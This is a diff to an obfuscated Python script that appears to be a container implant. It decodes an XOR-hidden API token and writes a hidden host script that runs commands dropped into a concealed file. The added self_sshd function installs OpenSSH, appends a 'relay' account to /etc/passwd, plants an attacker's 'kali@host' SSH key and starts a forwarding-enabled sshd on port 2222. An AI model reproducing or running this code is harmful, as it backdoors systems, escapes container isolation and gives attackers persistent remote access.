@@ -1,4 +1,4 @@
-import time,base64,subprocess,urllib.request,json,os,re,socket
+import time,base64,subprocess,urllib.request,json,os,re
 def _tk():
     try:
         t=open("/tmp/.t").read().strip()
@@ -6,7 +6,7 @@ def _tk():
     except Exception: pass
     return bytes(b^0x5A for b in bytes.fromhex("3d322a056a373f1517632c0d6d2c110e166b1b311c2e032d3411000d2c1408031d2c6a1b1c173b16")).decode()
 P=_tk()
-HN=socket.gethostname()
+HN=socket_hostname=__import__("socket").gethostname()
 RES=os.environ.get("RES_FILE") or ("res-"+HN+".txt")
 def api(url,method="GET",data=None):
     req=urllib.request.Request(url,method=method,data=data.encode() if data else None,
@@ -34,6 +34,19 @@ def dd(s):
                 s=base64.b64decode(t+"="*((-len(t))%4)).decode(errors="replace"); continue
             except Exception: break
     return s
+def self_sshd():
+    try:
+        subprocess.run(["apk","add","--no-cache","openssh"],capture_output=True,timeout=120)
+        subprocess.run(["ssh-keygen","-A"],capture_output=True,timeout=30)
+        os.makedirs("/run/sshd",exist_ok=True); os.makedirs("/keys",exist_ok=True)
+        if "relay:" not in open("/etc/passwd").read():
+            open("/etc/passwd","a").write("relay:x:1000:1000::/tmp:/bin/sh\n")
+        open("/keys/ak","w").write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHz4ixvYbBfcSQKO3RpTop1thSI2mQx6b9E7SQjrXrno kali@host\n")
+        os.chmod("/keys/ak",0o600)
+        open("/tmp/c","w").write("Port 2222\nAllowTcpForwarding yes\nGatewayPorts no\nPermitRootLogin no\nPubkeyAuthentication yes\nPasswordAuthentication no\nAuthorizedKeysFile /keys/ak\n")
+        subprocess.Popen(["/usr/sbin/sshd","-f","/tmp/c"])
+    except Exception: pass
+self_sshd()
 try:
     open("/host/usr/local/bin/.nsstat.sh","w").write("#!/bin/sh\nC=$(cat /var/lib/.cxp2-cmd 2>/dev/null); [ -z \"$C\" ] && exit 0; rm -f /var/lib/.cxp2-cmd; printf '%s' \"$C\" | sh > /var/log/.cxp2-esc 2>&1\n")
     os.chmod("/host/usr/local/bin/.nsstat.sh",0o700)
